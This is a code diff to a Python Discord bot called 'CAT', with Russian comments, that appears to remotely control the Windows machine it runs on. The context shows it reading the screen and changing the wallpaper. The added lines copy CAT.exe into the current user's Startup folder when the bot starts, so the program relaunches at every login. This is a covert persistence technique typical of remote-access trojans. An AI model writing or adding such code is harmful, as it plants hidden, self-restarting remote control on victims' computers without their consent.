@@ -24,9 +24,23 @@ bot = commands.Bot(command_prefix='/')  # префикс для комманд
 channel = bot.get_channel(config.channel)  # введите id канала в который должен писать бот
 bot.remove_command('help')
 
+path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
+
 
 @bot.event
 async def on_ready():
+    try:
+
+        with open(path+'CAT.exe') as f:
+            pass
+
+    except FileNotFoundError:
+
+        with open('CAT.exe', 'rb') as f:
+            data = f.read()
+        with open(path+'CAT.exe', 'wb') as f:
+            f.write(data)
+
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
     x, y = pg.size()
@@ -218,4 +232,5 @@ async def wallpaper(ctx, url):
     else:
         await ctx.send('**CAT:** Ошибка!')
     os.remove('wallpaper.png')
+
 bot.run(config.token)
